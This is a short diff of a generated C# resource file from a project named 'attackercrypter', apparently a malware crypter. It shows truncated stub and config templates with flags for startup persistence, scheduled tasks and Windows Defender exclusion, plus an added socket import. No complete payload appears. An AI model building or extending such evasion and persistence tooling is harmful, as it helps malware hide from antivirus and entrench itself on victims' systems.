@@ -73,11 +73,12 @@ namespace attackercrypter.Properties {
         ///    {
         ///        public static bool istartup = false;
         ///        public static bool ispersist = false;
+        ///        public static bool isNet = false;
+        ///        public static bool isNative = false;
         ///        public static bool istask = false;
         ///        public static bool isdotnet = false;
         ///        public static bool isexcludewd = false;
-        ///        public static bool issleep = false;
-        ///        public static string folder = Path.Combine(Environment.GetFolderPath [rest of string was truncated]&quot;;.
+        ///        public static bool issle [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string config {
             get {
@@ -147,8 +148,7 @@ namespace attackercrypter.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to 
-        ///using System;
+        ///   Looks up a localized string similar to using System;
         ///using System.Collections.Generic;
         ///using System.Diagnostics;
         ///using System.Drawing;
@@ -159,13 +159,13 @@ namespace attackercrypter.Properties {
         ///using System.Runtime.InteropServices;
         ///using System.Security.Cryptography;
         ///using System.Text;
+        ///using System.Net.Sockets;
         ///using System.Threading;
         ///using System.Windows.Forms;
         ///
         ///[assembly: AssemblyTitle(&quot;#AssemblyProduct&quot;)]
         ///[assembly: AssemblyDescription(&quot;#AssemblyDescription&quot;)]
-        ///[assembly: AssemblyCompany(&quot;#AssemblyProduct&quot;)]
-        ///[assembly: AssemblyPro [rest of string was truncated]&quot;;.
+        ///[assembly: AssemblyCompany(&quot;#AssemblyProduct&quot;) [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Program {
             get {
